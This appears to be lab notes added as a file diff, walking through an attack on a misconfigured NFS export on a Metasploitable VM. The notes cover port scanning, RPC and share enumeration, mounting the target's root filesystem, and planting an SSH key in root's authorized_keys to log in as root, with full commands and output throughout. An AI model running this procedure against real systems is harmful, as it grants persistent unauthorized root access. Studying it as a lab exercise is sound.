@@ -1,0 +1,256 @@
+Network File System
+===================
+Network File System is a distributed file system protocol 
+originally developed by Sun Microsystems in 1984, allowing 
+a user on a client computer to access files over a computer
+network much like local storage is accessed. NFS, like many
+other protocols, builds on the Open Network Computing Remote
+Procedure Call system. The NFS is an open standard defined 
+in Request for Comments, allowing anyone to implement the protocol.
+
+
+1. NMAP SCAN TARGET
+2. HUNT ALL NFS, RPCBIND AND SSH DAEMONS
+3. CONDUCT NFS ASSESSMENT
+4. SHOWMOUNT TO ID ALL SHARED FILE SYSTEMS
+5. CREATING SSH KEY PAIR ON ATTACKERS MACHINE
+6. MOUNT VICTIMs ROOT FILE SYSTEM ON ATTACKERS ROOT COMPUTER
+7. MODIFY VICTIMS AUTHORIZED_KEYS FILE BY APPENDING ATTACKERS KEYS
+8. OBTAIN ROOT ACCESS
+
+1. NMAP SCAN TARGET
+===================
+root@alice:~# nmap -p 1-65535 -T4 -A -v 192.168.209.151 2>&1 | tee fileNFSscan.txt
+root@alice:~# nmap -sT -T4 -sV -p 1-65535 192.168.209.151 -oA fileNFSscan1
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-06 16:26 EDT
+Nmap scan report for 192.168.209.151
+Host is up (0.11s latency).
+Not shown: 65155 closed ports, 350 filtered ports
+PORT      STATE SERVICE     VERSION
+
+2. HUNT ALL NFS, RPCBIND AND SSH DAEMONS
+===============================================
+root@alice:~# egrep -i '(nfs|rpcbind|ssh)' fileNFSscan1.nmap
+# Nmap 7.70 scan initiated Sun May  6 16:26:48 2018 as: 
+nmap -sT -T4 -sV -p 1-65535 -oA fileNFSscan1 192.168.209.151
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+111/tcp   open  rpcbind     2 (RPC #100000)
+2049/tcp  open  nfs         2-4 (RPC #100003)
+root@alice:~# 
+
+OR
+
+root@alice:~# egrep -i '(nfs|rpcbind|ssh)' fileNFSscan.nmap
+# Nmap 7.70 scan initiated Sun May  6 16:08:25 2018 as: 
+nmap -sT -T4 -A -p 1-65535 -oA fileNFSscan 192.168.209.151
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+111/tcp   open  rpcbind     2 (RPC #100000)
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+2049/tcp  open  nfs         2-4 (RPC #100003)
+root@alice:~# 
+
+3. CONDUCT NFS ASSESSMENT
+===========================
+Finf every RPC info on the server. e.g: mountd, portmapper, nfs, status, etc.
+
+root@alice:~# rpcinfo -p 192.168.209.151
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  32809  status
+    100024    1   tcp  40087  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  55171  nlockmgr
+    100021    3   udp  55171  nlockmgr
+    100021    4   udp  55171  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  33922  nlockmgr
+    100021    3   tcp  33922  nlockmgr
+    100021    4   tcp  33922  nlockmgr
+    100005    1   udp  35571  mountd
+    100005    1   tcp  39015  mountd
+    100005    2   udp  35571  mountd
+    100005    2   tcp  39015  mountd
+    100005    3   udp  35571  mountd
+    100005    3   tcp  39015  mountd
+root@alice:~# rpcinfo -p 192.168.209.151 | grep nfs
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+root@alice:~# 
+
+4. SHOWMOUNT TO ID ALL SHARED FILE SYSTEMS
+==========================================
+root@alice:~# showmount -e 192.168.209.151
+Export list for 192.168.209.151:
+/ *
+The "/" filesystem is owned by root for most flavors of Unix and Linux.
+Opening this "/" to the whole world is a big issue.
+
+5. CREATING SSH KEY PAIR ON ATTACKERS MACHINE
+=============================================
+root@alice:~# mkdir -p /root/ .ssh
+root@alice:~# cd /root/.ssh/
+root@alice:~/.ssh# ls
+known_hosts
+root@alice:~/.ssh# cat known_hosts
+|1|xABYh6gcd54AdCPGLIMwEwMQ2zI=|Y8mJahVkqSRJSmCN2PZHuCCYgpM= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPCtj5pAPq+SVZBjNO+2f77zK25Ro5YYsX6urbL9Mh8wgO+lrHyU0/I0VNba24+i1+qs2ia3FY5O+6ycr1CB/NI=
+|1|FJFeyi5NVQ0q0394jIuX2EDu/gY=|zdFbfM3CIenZklOaDk8KDRG2Crw= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPCtj5pAPq+SVZBjNO+2f77zK25Ro5YYsX6urbL9Mh8wgO+lrHyU0/I0VNba24+i1+qs2ia3FY5O+6ycr1CB/NI=
+|1|sz7hQ6KYS+/4zSMdQJq6guSNDYM=|EMWenShUVDt3IIvrQg9KB/z7z68= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPCtj5pAPq+SVZBjNO+2f77zK25Ro5YYsX6urbL9Mh8wgO+lrHyU0/I0VNba24+i1+qs2ia3FY5O+6ycr1CB/NI=
+|1|A32/+Vl29d3jaxn5UFa28sd6z7w=|lOVgxHZC4XJTb7Cq1ARfgWaZLTM= ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+|1|SMjHWi9OHnnrafGMFAyishnBpQI=|FPylIGcap1MDZPNwFAMuZ7bEALw= ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+
+root@alice:~/.ssh# cat /dev/null > known_hosts
+# Dev null just points to nowhere, pipe anything to that, and it disappears
+# This can avoid man in the middle known_hosts message.
+
+root@alice:~/.ssh# ls
+known_hosts
+root@alice:~/.ssh# ssh-keygen -t rsa -b 4096
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): noondi_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in noondi_rsa.
+Your public key has been saved in noondi_rsa.pub.
+The key fingerprint is:
+SHA256:yiXJb6gawd5cQRKsOUpbY0XAjUvrBr9+K6jw7mxfQrQ root@alice
+The key's randomart image is:
++---[RSA 4096]----+
+|  .oBo.          |
+|   +.=           |
+|  .o= .          |
+| ++B o o         |
+|..X.E = S        |
+|.o O o *         |
+|. = = = o        |
+|.+.+ = .         |
+|o+B+=..          |
++----[SHA256]-----+
+root@alice:~/.ssh# ls -l
+total 8
+-rw-r--r-- 1 root root    0 May  6 17:34 known_hosts
+-rw------- 1 root root 3247 May  6 17:37 noondi_rsa
+-rw-r--r-- 1 root root  736 May  6 17:37 noondi_rsa.pub
+root@alice:~/.ssh# 
+'
+6. MOUNT VICTIMs ROOT FILE SYSTEM ON ATTACKERS ROOT COMPUTER
+============================================================
+root@alice:/# mount -t nfs 192.168.209.151:/ /mnt -o nolock
+# NOLOCK DISABLES FILE LOCKING
+
+root@alice:/# df -k
+Filesystem        1K-blocks     Used Available Use% Mounted on
+udev                1018784        0   1018784   0% /dev
+tmpfs                206516    17560    188956   9% /run
+/dev/sda1          59599788 24918876  31623712  45% /
+tmpfs               1032580     5500   1027080   1% /dev/shm
+tmpfs                  5120        0      5120   0% /run/lock
+tmpfs               1032580        0   1032580   0% /sys/fs/cgroup
+tmpfs                206516       12    206504   1% /run/user/131
+tmpfs                206516       52    206464   1% /run/user/0
+192.168.209.151:/   7282176  1482560   5432576  22% /mnt  
+root@alice:/# 
+# WE HAVE SUCCESSFULLY MOUNTED VICTIM'S ROOT FILE on ATTACKER'S /mnt DIRECTORY
+
+7. MODIFY VICTIMS AUTHORIZED_KEYS FILE BY APPENDING ATTACKERS KEYS
+==================================================================
+root@alice:/# cd /mnt/root/.ssh
+root@alice:/mnt/root/.ssh# ls
+authorized_keys  known_hosts
+root@alice:/mnt/root/.ssh# cp /root/.ssh/noondi_rsa.pub /mnt/root/.ssh/
+root@alice:/mnt/root/.ssh# ls -l
+total 12
+-rw-r--r-- 1 root root 405 May 17  2010 authorized_keys
+-rw-r--r-- 1 root root 442 May 20  2012 known_hosts
+-rw-r--r-- 1 root root 736 Apr 22 19:56 noondi_rsa.pub
+root@alice:/mnt/root/.ssh# cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGo
+i4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL
+/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWW
+TQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU
+3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA
+73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVx
+sXovcNnbALTp3w== msfadmin@metasploitable
+root@alice:/mnt/root/.ssh# cat noondi_rsa.pub >> authorized_keys
+root@alice:/mnt/root/.ssh# cat authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNm
+j6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKA
+z1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777
+GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIz
+Iu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2
+OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable #original keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF3V6SXuhO0PVKyUa9hwPJ965GrJMkgAbm2fQtS
++S3eBDHhP5oLucXIjhlN3MyE8nkOYikej57XigwpJk/Ki38JzVX/rhEjbbLNTa4T26qWxzBSd9ly
+WeLQXkRaJt1ekzdwdOI/b9EhDSF127ApwTZ9U+jaB8Zx+q5yjxEji99w3r1d2paZQoaxvaXJgHUB
+FgLXaSGPGBGVkkhIm0SXyxDINmBFERCLVGZ+r0+YikjLDL8wDxlDzLj29S9Wkt1RK5gkDGHGKtX
+/gBHNkDkVCsXUjnfyMAeC1NP85qVAqNjZgPvxOliYYReDVwjNvBsSQDjKAjR/L75uxnobaz2oWHzw
+PhlfCuCWZxuAv8KdbNTbcmXznU3KQZJRXgn7Bb4uvq2E/D2zSzM+aavcpFBMV9C4AYjOdqwz00z2
+ghf6CI8WMp+QfttmR+x0RZhcd4u+H9ZfXmXfWr69XZ1JpldrzzOFNnXZnM9gWv/U2OI4udBJZOcA
+qFtavcyYXmAao5RVIk1XjlGaIhj9S9VNdD1An7bfC7GANFoycQi2F2kgjzoVIB6W0ZTEf/pxM6b4
+ULZF1AgTRLrUPktop+PRjO7Z/cLA8XY8ZULqSYfN2U94AqvygtdKyc+CTC+Nmn81QK31AeD5T50A
+SjYRqCjZCDabiukQqGSNTGODgzuIrhE5peM+Q== root@alice # appended keys
+root@alice:/mnt/root/.ssh# 
+
+8. OBTAIN ROOT ACCESS
+======================
+root@alice:/mnt/root/.ssh# cd /root/.ssh/
+root@alice:~/.ssh# pwd
+/root/.ssh
+root@alice:~/.ssh# ssh -i /root/.ssh/noondi_rsa root@192.168.209.151
+The authenticity of host '192.168.209.151 (192.168.209.151)' can't be established.'
+RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.209.151' (RSA) to the list of known hosts.
+Last login: Fri Apr 20 23:02:33 2018 from :0.0
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+root@metasploitable:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# ifconfig eth0 | grep inet
+          inet addr:192.168.209.151  Bcast:192.168.209.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:feda:d0d3/64 Scope:Link
+root@metasploitable:~# 
+
+UNMOUNT VICTIMS "/" FILE
+=========================
+root@alice:~/.ssh# showmount -a 192.168.209.151
+All mount points on 192.168.209.151:
+192.168.209.179:/
+root@alice:~/.ssh# umount /mnt
+root@alice:~/.ssh# df -k
+Filesystem     1K-blocks     Used Available Use% Mounted on
+udev             1018784        0   1018784   0% /dev
+tmpfs             206516    17564    188952   9% /run
+/dev/sda1       59599788 24920432  31622156  45% /
+tmpfs            1032580     5500   1027080   1% /dev/shm
+tmpfs               5120        0      5120   0% /run/lock
+tmpfs            1032580        0   1032580   0% /sys/fs/cgroup
+tmpfs             206516       12    206504   1% /run/user/131
+tmpfs             206516       52    206464   1% /run/user/0
+root@alice:~/.ssh# showmount -a 192.168.209.151
+All mount points on 192.168.209.151:
+
